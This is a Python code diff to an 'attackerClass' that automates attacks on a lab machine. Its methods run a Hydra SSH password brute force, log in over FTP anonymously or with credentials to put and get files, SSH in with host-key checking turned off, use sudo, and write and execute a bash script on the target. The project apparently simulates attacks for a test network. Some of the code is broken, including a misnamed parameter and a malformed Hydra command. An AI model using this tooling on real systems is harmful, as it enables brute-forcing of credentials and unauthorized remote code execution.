@@ -4,6 +4,7 @@ import re
 import time
 from pexpect import pxssh
 import logging as log
+import inspect
 
 log.basicConfig()
 
@@ -16,13 +17,41 @@ class attackerClass(object):
 		self.password = ""
 		self.command = ""
 		self.db_array = ""
+		self.method = ""
 		
 	"===================================================================INITIALISE========================================================================="
 	
-	def kill_hydra(self):
+	@staticmethod
+	def kill_hydra():
+		'''
+		Method kills hydra service
+		'''
 		os.system("pkill -f hydra")
 
-	def hydra_spawn(self,ip):
+	@staticmethod
+	def generate_random_request(service_array):
+		'''
+		Method generates random
+		'''
+		service = service_array["Service"]
+		ip = service_array["IP"]
+		user = service_array["User"] 
+		password = service_array["Password"]
+		method = service_array["Method"]
+		
+		print("Executing :"+ method)
+		attackerClass.call_class_method(method,ip,user,password)
+		
+	@staticmethod	
+	def call_class_method(method,ip,user,password):
+		values = {"IP":ip,"User":user,"Pass":password}
+		the_method = getattr(attackerClass,method)(values)
+		#print(inspect.getargspec(method))
+		print("Metohd: "+method+" Executed")
+		
+	
+	@staticmethod	
+	def hydra_spawn(*args): 
 		'''
 		Start Hydra and find username and password for IP address
 		If username and password found kill hydra 
@@ -30,12 +59,12 @@ class attackerClass(object):
 		'''
 		try:
 			print("Hydra BruteForce Being Executed")
-			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
+			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(args)	
 			child = pexpect.spawn(command)	
 			time.sleep(30)
 			print("BruteForce Successfully Executed")
 			child.close()
-			self.kill_hydra()
+			attackerClass.kill_hydra()
 
 		except Exception as e:
 			print str(e)
@@ -44,14 +73,19 @@ class attackerClass(object):
 		except pexpect.EOF:
 			print("BruteForce Executed")
 			child.close()
-			self.kill_hydra()
+			attackerClass.kill_hydra()
 
 	"===================================================================FTP METHODS========================================================================="		
 	#Anonymous User Methods
-	def execute_ftp_login_anon_user(self,user,ip):
+	@staticmethod
+	def execute_ftp_login_anon_user(args):#ip,user):
 		'''
 		FTP directly into the machine using parameters received
 		'''
+		
+		ip = args["IP"]
+		user = args["User"]
+		
 		try:
 			print("Anonymous Login Being Executed")
 			line = "ftp -p {}".format(ip)	
@@ -66,12 +100,16 @@ class attackerClass(object):
 		except Exception as e:
 			print str(e)
 			log.exception(e)
-
-	def execute_ftp_put_anon_file(self,user,ip):		
+			
+	@staticmethod
+	def execute_ftp_put_anon_file(args):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
 		'''
+		ip = args["IP"]
+		user = args["User"]
+		
 		try:
 			print("Anonymous File Creation Being Executed")
 			line = "ftp -p {}".format(ip)	
@@ -89,11 +127,16 @@ class attackerClass(object):
 			print str(e)
 			log.exception(e)
 
-	def execute_ftp_get_anon_file(self,user,ip):		
+	@staticmethod
+	def execute_ftp_get_anon_file(args):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
 		'''
+		
+		ip = args["IP"]
+		user = args["User"]
+		
 		try:
 			print("Anonymous File Download Executed")
 			line = "ftp -p {}".format(ip)
@@ -112,11 +155,16 @@ class attackerClass(object):
 			print str(e)
 			log.exception(e)
 
-	#Normal User Methods		
-	def execute_ftp_login_normal_user(self,user,password,ip):
+	#Normal User Methods	
+	@staticmethod
+	def execute_ftp_login_normal_user(args):
 		'''
 		FTP directly into the machine using parameters received
 		'''
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("Login Being Executed")
 			line = "ftp -p {}".format(ip)	
@@ -133,11 +181,17 @@ class attackerClass(object):
 		except Exception as e:
 			print str(e)
 
-	def execute_ftp_put_user_file(self,user,password,ip):		
+	@staticmethod
+	def execute_ftp_put_user_file(args):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
 		'''
+		
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("File Creation Being Executed")
 			line = "ftp -p {}".format(ip)
@@ -158,11 +212,17 @@ class attackerClass(object):
 			print str(e)
 			log.exception(e)
 
-	def execute_ftp_get_user_file(self,user,password,ip):		
+	@staticmethod
+	def execute_ftp_get_user_file(args):		
 		'''
 		FTP directly into the machine using parameters received
 		Put a file into the machine
 		'''
+		
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("File Download Being Executed")
 
@@ -187,10 +247,15 @@ class attackerClass(object):
 	
 	"===================================================================SSH METHODS========================================================================="		
 	#Make precautions for new key when prompted so
-	def execute_ssh_login(self,user,password,ip):
+	@staticmethod
+	def execute_ssh_login(args):
 		'''
 		SSH directly into the machine using parameters received
 		'''
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("SSH sudo Login Being Executed")
 			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
@@ -222,10 +287,15 @@ class attackerClass(object):
 			print("Error")
 			print str(e)
 
-	def execute_ssh_sudo(self,user,password,ip):
+	@staticmethod
+	def execute_ssh_sudo(args):
 		'''
 		SSH directly into the machine using parameters received
 		'''
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("SSH sudo Login Being Executed") 
 			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
@@ -262,10 +332,16 @@ class attackerClass(object):
 			print str(e)
 
 
-	def execute_ssh_create_file(self,user,password,ip):
+	@staticmethod
+	def execute_ssh_create_file(args):
 		'''
 		SSH directly into the machine using parameters received
 		'''
+		
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("File Being Created")
 
@@ -305,10 +381,15 @@ class attackerClass(object):
 		except pxssh.ExceptionPxssh as e:
 			print str(e)
 
-	def execute_ssh_execute_file(self,user,password,ip):
+	@staticmethod
+	def execute_ssh_execute_file(iargs):
 		'''
 		SSH directly into the machine using parameters received
 		'''
+		ip = args["IP"]
+		user = args["User"]
+		password = args["Pass"]
+		
 		try:
 			print("File Being Executed")
 			file_command = "{} {}".format("bash","exe.sh")
@@ -349,4 +430,5 @@ class attackerClass(object):
 
 if __name__ == "__main__":
 	object = attackerClass()
-	object.execute_ssh_create_file("ubuntu","ubuntu","10.0.5.37")
+	the_array = {"Service":"SSH","IP":"10.0.5.37","User":"ubuntu","Password":"ubuntu","Method":"execute_ssh_create_file"}
+	object.generate_random_request(the_array)
